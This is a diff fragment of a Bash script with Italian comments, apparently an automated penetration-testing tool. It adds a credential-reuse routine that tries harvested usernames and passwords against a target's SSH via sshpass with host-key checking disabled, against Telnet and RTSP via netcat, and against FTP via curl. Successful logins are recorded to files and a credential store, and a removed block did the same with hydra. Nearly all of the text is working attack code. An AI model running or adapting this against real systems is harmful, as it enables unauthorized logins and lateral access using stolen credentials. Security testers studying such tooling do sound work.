+                        echo "${_cu}:${_cpass}" >> "$_corr_dir/web_${_cport}.txt"
+                        _cred_store_add "$_csc" "$target" "$_cport" "$_cu" "$_cpass" "corr:reuse"
                     fi
                 done
+
+                # SSH
+                if _port_open 22; then
+                    local _ssh_res
+                    _ssh_res=$(timeout 8 sshpass -p "$_cpass" ssh \
+                        -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o BatchMode=no \
+                        -o NumberOfPasswordPrompts=1 \
+                        "${_cu}@${target}" "id" 2>/dev/null || true)
+                    if [[ -n "$_ssh_res" ]]; then
+                        found CRITICAL "Cred reuse SSH:22 — ${_cu}:${_cpass} → $_ssh_res"
+                        echo "${_cu}:${_cpass}" >> "$_corr_dir/ssh.txt"
+                        _cred_store_add ssh "$target" 22 "$_cu" "$_cpass" "corr:reuse"
+                    fi
+                fi
+
+                # Telnet
+                if _port_open 23; then
+                    local _tel_res
+                    _tel_res=$(timeout 8 bash -c \
+                        "printf '${_cu}\n${_cpass}\nid\nexit\n' | nc -w 5 ${target} 23 2>/dev/null" || true)
+                    if echo "$_tel_res" | grep -qP "uid=\d+|#\s*$|\$\s*$"; then
+                        found CRITICAL "Cred reuse Telnet:23 — ${_cu}:${_cpass}"
+                        echo "${_cu}:${_cpass}" >> "$_corr_dir/telnet.txt"
+                        _cred_store_add telnet "$target" 23 "$_cu" "$_cpass" "corr:reuse"
+                    fi
+                fi
+
+                # FTP
+                if _port_open 21; then
+                    local _ftp_code
+                    _ftp_code=$(curl -s -o /dev/null -w "%{http_code}" \
+                        --user "${_cu}:${_cpass}" --max-time 6 \
+                        "ftp://${target}/" 2>/dev/null || echo "000")
+                    if [[ "$_ftp_code" == "226" || "$_ftp_code" == "200" ]]; then
+                        found HIGH "Cred reuse FTP:21 — ${_cu}:${_cpass}"
+                        echo "${_cu}:${_cpass}" >> "$_corr_dir/ftp.txt"
+                        _cred_store_add ftp "$target" 21 "$_cu" "$_cpass" "corr:reuse"
+                    fi
+                fi
+
+                # RTSP
+                if _port_open 554 || _port_open 8554; then
+                    local _rp_corr=554; _port_open 8554 && _rp_corr=8554
+                    local _rtsp_corr
+                    _rtsp_corr=$(timeout 5 bash -c \
+                        "printf 'DESCRIBE rtsp://${_cu}:${_cpass}@${target}:${_rp_corr}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n' \
+                         | nc -q 2 ${target} ${_rp_corr} 2>/dev/null" || true)
+                    if echo "$_rtsp_corr" | grep -q "^RTSP/1.0 200"; then
+                        found HIGH "Cred reuse RTSP:${_rp_corr} — ${_cu}:${_cpass}"
+                        echo "${_cu}:${_cpass}" >> "$_corr_dir/rtsp.txt"
+                        _cred_store_add rtsp "$target" "$_rp_corr" "$_cu" "$_cpass" "corr:reuse"
+                    fi
+                fi
             done
-            # Prova anche su SSH e Telnet
-            if _port_open 22; then
-                hydra -l admin -p "$_found_community" -l root -p "$_found_community" \
-                    -t 2 -f -o "$OUTDIR_BASE/snmp/reuse_ssh.txt" "$target" ssh 2>/dev/null || true
-                grep -i "login:" "$OUTDIR_BASE/snmp/reuse_ssh.txt" 2>/dev/null && \
-                    found HIGH "SNMP community reuse: SSH — $( grep 'login:' "$OUTDIR_BASE/snmp/reuse_ssh.txt" | head -1)"
-            fi
+            local _corr_hits; _corr_hits=$(find "$_corr_dir" -name "*.txt" -size +0c 2>/dev/null | wc -l)
+            [[ "$_corr_hits" -gt 0 ]] && ok "  Correlazione: $_corr_hits servizi aggiuntivi compromessi con credenziali riutilizzate"
         fi
     else
-        echo -e "${CYAN}[DRY-RUN]${NC} SNMP community reuse → web/SSH/Telnet"
+        echo -e "${CYAN}[DRY-RUN]${NC} Correlazione credenziali cross-service (password reuse su tutti i servizi)"
     fi
 
     # ── Brute-force VoIP/streaming — via moduli dedicati (non creds) ─
@@ -9630,6 +11493,7 @@ cmd_auto() {
     # ─────────────────────────────────────────────────────────
     # FASE 4 — REPORT PDF
     # ─────────────────────────────────────────────────────────
+    _phase_num=4
     echo ""
     echo -e "${BOLD}${GREEN}══════════════════════════════════════════${NC}"
     echo -e "${BOLD}${GREEN}  FASE 4 — REPORT PDF                     ${NC}"
